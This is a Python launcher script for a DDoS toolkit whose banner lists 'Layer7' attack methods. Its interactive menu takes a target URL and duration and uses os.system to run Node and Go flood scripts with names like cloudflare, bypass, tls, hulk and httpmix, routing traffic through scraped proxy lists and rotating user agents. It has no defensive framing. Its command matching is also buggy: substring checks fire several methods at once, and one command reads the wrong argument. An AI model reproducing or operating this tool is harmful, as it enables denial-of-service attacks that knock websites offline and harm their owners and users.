#okegasss

import os, time
from crt.prox import *

baner="""
   _  __            ____      __          _______________
  | |/ /____  _  __/ __ \____/ /___  ____/__  /__  /__  /
  |   // __ \| |/_/ / / / __  / __ \/ ___/ / /  / /  / / 
 /   |/ / / />  </ /_/ / /_/ / /_/ (__  ) / /  / /  / /  
/_/|_/_/ /_/_/|_/_____/\__,_/\____/____/ /_/  /_/  /_/   

Methods Ddos Layer7 :

- browser          - tlsv1          - bypass
- cloudflare       - tlsv2          - httprand
- httpmix          - httpes          - hulk
- httpmix2         - httpsv2        - tbypass
- tls              - httpsv3        - xbypass
- tuam             - hold           - bws2
- tessl

- addua
- addprox
"""

class Main:
    def __init__(self) -> None:
        self.kocok()

    def hapus(self):
        linux="clear"
        windows="cls"
        os.system([linux,windows][os.name == 'nt'])


    def kocok(self):
        self.hapus()
        print(baner)
        while(True):
            xx=input(" xxxx>> ")
            if xx == 'addprox':
                self.hapus()
                print(" Wait for scrape proxy... \n")
                ham()
                time.sleep(3)

            if xx == 'addua':
                os.system("node crt/adua.js")
                os.system("node crt/cekua.js")

            if xx == 'clear':
                self.kocok()

            if "browser" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/BROWSER {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: browser <url> <time>")
                    print(" Example: browser http://target.com 60")

            if "cloudflare" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/cf {target} {time} 100")
                except IndexError:
                    print(" Usage: cloudflare <url> <time>")
                    print(" Example: cloudflare http://target.com 60")

            if "httpmix" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/mix {target} {time}")
                except IndexError:
                    print(" Usage: httpmix <url> <time>")
                    print(" Example: httpmix http://target.com 60")

            if "httpmix2" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/http-mix {target} {time} 100")
                except IndexError:
                    print(" Usage: httpmix2 <url> <time>")
                    print(" Example: httpmix2 http://target.com 60")

            if "tls" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/tls {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: tls <url> <time>")
                    print(" Example: tls http://target.com 60")

            if "tlsv1" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/tlsv1 {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: tlsv1 <url> <time>")
                    print(" Example: tlsv1 http://target.com 60")

            if "tlsv2" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/v2 {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: tlsv2 <url> <time>")
                    print(" Example: tlsv2 http://target.com 60")

            if "httpsv2" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/httpsv2 {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: httpsv2 <url> <time>")
                    print(" Example: httpsv2 http://target.com 60")

            if "httpsv3" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/httpsv3 {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: httpsv3 <url> <time>")
                    print(" Example: httpsv3 http://target.com 60")

            if "httpes" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/https {target} {time} 100 10 proxy.txt bypass")
                except IndexError:
                    print(" Usage: https <url> <time>")
                    print(" Example: https http://target.com 60")

            if "bypass" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/bypass3 GET {target} proxy.txt {time} 100 10")
                except IndexError:
                    print(" Usage: bypass <url> <time>")
                    print(" Example: bypass http://target.com 60")

            if "httprand" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/HTTP-RANDOM {target} {time}")
                except IndexError:
                    print(" Usage: httprand <url> <time>")
                    print(" Example: httprand http://target.com 60")

            if "hulk" in xx:
                try:
                    target=xx.split()[1]
                    os.system(f"go run ool/Hulk.go -site {target} -data GET")
                except IndexError:
                    print(" Usage: hulk <url> ")
                    print(" Example: hulk http://target.com")

            if "tbypass" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/TLS-BYPASS {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: tbypass <url> <time>")
                    print(" Example: tbypass http://target.com 60")

            if "tuam" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/TLS-UAM {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: tuam <url> <time>")
                    print(" Example: tuam http://target.com 60")

            if "hold" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/Hold {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: hold <url> <time>")
                    print(" Example: hold http://target.com 60")

            if "xbypass" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/X-BYPASS {target} {time} 100 10 proxy.txt")
                except IndexError:
                    print(" Usage: xbypass <url> <time>")
                    print(" Example: xbypass http://target.com 60")

            if "bws2" in xx:
                try:
                    target=xx.split()[1]
                    time=xx.split()[2]
                    os.system(f"node ool/browser2 {target} 100 proxy.txt 5 5 {time} on")
                except IndexError:
                    print(" Usage: bws2 <url> <time>")
                    print(" Example: bws2 http://target.com 60")

            if "tessl" in xx:
                try:
                    target = xx.split()[1]
                    time = xx.split()[4] 
                    os.system(f'node ool/tessl.js {target} {time}')
                except IndexError:
                    print('Usage: tessl <target> <time>')
                    print('Example: tessl https://google.com 60')

if __name__=='__main__':
    Main()